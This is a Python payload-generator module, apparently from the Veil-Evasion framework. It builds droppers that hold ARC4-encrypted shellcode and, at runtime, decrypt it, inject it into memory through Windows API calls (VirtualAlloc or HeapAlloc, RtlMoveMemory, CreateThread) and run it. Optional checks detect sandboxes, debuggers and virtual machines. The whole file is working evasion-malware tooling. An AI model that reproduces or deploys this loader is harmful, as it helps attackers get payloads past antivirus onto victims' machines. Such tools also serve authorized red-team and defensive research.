"""

This payload has ARC encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.


Great examples and code adapted from
http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/

module by @christruncer

"""


from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "ARC4 Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        self.name = "Python ARC4 Encrypted"
        self.path = "python/shellcode_inject/arc_encrypt"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "CLICKTRACK"     : ["X", "Optional: Minimum number of clicks to execute payload"],
            "UTCCHECK"       : ["FALSE", "Optional: Validates system does not use UTC timezone"],
            "VIRTUALFILES"   : ["FALSE", "Optional: Check if VM supporting files exist"],
            "VIRTUALDLLS"    : ["FALSE", "Check for dlls loaded in memory"],
            "CURSORMOVEMENT" : ["FALSE", "Check if cursor is in same position after 30 seconds"],
            "USERPROMPT"     : ["FALSE", "Make user click prompt prior to execution"],
            "MINRAM"         : ["FALSE", "Check for at least 3 gigs of RAM"],
            "SANDBOXPROCESS" : ["FALSE", "Check for common sandbox processes"],
            "DETECTDEBUG"    : ["FALSE", "Check if debugger is present"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # Generate the variable names
        randctypes = evasion_helpers.randomString()
        ShellcodeVariableName = evasion_helpers.randomString()
        rand_ptr = evasion_helpers.randomString()
        rand_ht = evasion_helpers.randomString()
        RandARCPayload = evasion_helpers.randomString()
        RandEncShellCodePayload = evasion_helpers.randomString()
        RandARCKey = evasion_helpers.randomString()
        rand_virtual_protect = evasion_helpers.randomString()

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = Shellcode.encode('latin-1')
        Shellcode = Shellcode.decode('unicode_escape')

        payload_code, num_tabs_required = gamemaker.senecas_games(self)

        # encrypt the shellcode and get our randomized key
        encoded_ciphertext, encryption_key = encryption.arc_encryption(Shellcode)
        encoded_ciphertext = encoded_ciphertext.decode('ascii')

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":

            payload_code += '\t' * num_tabs_required + 'from Crypto.Cipher import ARC4\n'
            payload_code += '\t' * num_tabs_required + 'import base64\n'
            payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
            payload_code += '\t' * num_tabs_required + RandARCKey + ' = \'' + encryption_key + '\'\n'
            payload_code += '\t' * num_tabs_required + RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
            payload_code += '\t' * num_tabs_required + RandEncShellCodePayload + ' = base64.b64decode(\'' + encoded_ciphertext + '\')\n'
            payload_code += '\t' * num_tabs_required + ShellcodeVariableName + ' = ' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ')\n'
            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x04))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + rand_virtual_protect + ' = ' + randctypes + '.windll.kernel32.VirtualProtect(' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')),' + randctypes + '.c_int(0x20),' + randctypes + '.byref(' + randctypes + '.c_uint32(0)))\n'
            payload_code += '\t' * num_tabs_required + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            # Get heap specific variable
            HeapVar = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'from Crypto.Cipher import ARC4\n'
            payload_code += '\t' * num_tabs_required + 'import base64\n'
            payload_code += '\t' * num_tabs_required + 'import ctypes as ' + randctypes + '\n'
            payload_code += '\t' * num_tabs_required + RandARCKey + ' = \'' + encryption_key + '\'\n'
            payload_code += '\t' * num_tabs_required + RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
            payload_code += '\t' * num_tabs_required + RandEncShellCodePayload + ' = base64.b64decode(\'' + encoded_ciphertext + '\')\n'
            payload_code += '\t' * num_tabs_required + ShellcodeVariableName + ' = ' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ')\n'
            payload_code += '\t' * num_tabs_required + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
            payload_code += '\t' * num_tabs_required + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
